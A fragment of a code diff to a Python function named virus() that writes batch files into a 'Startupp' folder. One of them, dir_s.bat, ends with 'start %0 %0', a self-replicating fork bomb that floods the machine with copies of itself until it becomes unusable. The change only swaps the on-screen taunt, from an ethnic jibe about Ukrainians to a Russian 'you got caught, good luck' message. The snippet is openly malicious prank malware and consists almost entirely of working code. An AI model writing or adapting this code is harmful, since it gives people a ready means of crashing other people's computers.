@@ -9,7 +9,7 @@ def virus():
     if not os.path.isdir("Startupp"):
         os.mkdir("Startupp")
     with open(path+"\\Startupp\\dir_s.bat", "w+") as w:
-        w.write('@echo off\ncolor a\necho сало сало сало сало украинско сало\nstart %0 %0')
+        w.write('@echo off\ncolor a\necho Ты попался на while(True)\necho Удачи))\nstart %0 %0')
 
     with open(path+"\\Startupp\\dir_spam.bat", "w+") as w:
         # you need a " " at the beginning otherwise it doesn't work :/
